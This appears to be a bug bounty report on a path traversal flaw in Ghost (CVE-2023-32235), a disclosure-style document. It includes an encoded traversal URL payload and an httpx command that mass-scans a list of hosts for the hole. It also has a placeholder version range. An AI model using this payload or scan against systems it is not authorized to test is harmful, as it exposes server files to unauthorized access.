# Bug Bounty Report - Ghost Path Traversal (CVE-2023-32235)

## Summary
The Ghost application is vulnerable to a path traversal vulnerability, identified as CVE-2023-32235. This vulnerability allows an attacker to access sensitive files outside the intended directory by manipulating the "package.json" file path.

## Vulnerability Details
- **CVE ID:** CVE-2023-32235
- **Vulnerability Type:** Path Traversal
- **Affected Application:** Ghost
- **Affected Versions:** All versions up to and including the latest version X.X.X
- **Impact:** Unauthorized access to sensitive files, potential exposure of confidential information.

## Proof of Concept (PoC)
The following Proof of Concept demonstrates the path traversal vulnerability:
{{base-uri}}/assets/built%2F..%2F..%2F/package.json


## Steps to Reproduce
1. Prepare a target list of "subs.txt" containing relevant URLs.
2. Execute the following command to test the vulnerability using the `httpx` tool:
httpx -l subs.txt -path "/assets/built%2F..%2F..%2F/package.json" -status-code -mc 200
3. Observe the responses for any successful requests, indicating the presence of the path traversal vulnerability.

## Impact
Successful exploitation of this vulnerability can lead to unauthorized access to sensitive files on the target server. This could potentially expose confidential information, compromise user privacy, and undermine the security of the affected application.

## Recommendation
To mitigate this vulnerability, it is recommended to implement strict input validation and sanitize user-supplied data when handling file paths. Developers should avoid directly accepting user input for file paths and instead use safe alternatives like whitelisting acceptable paths or utilizing security-focused libraries.

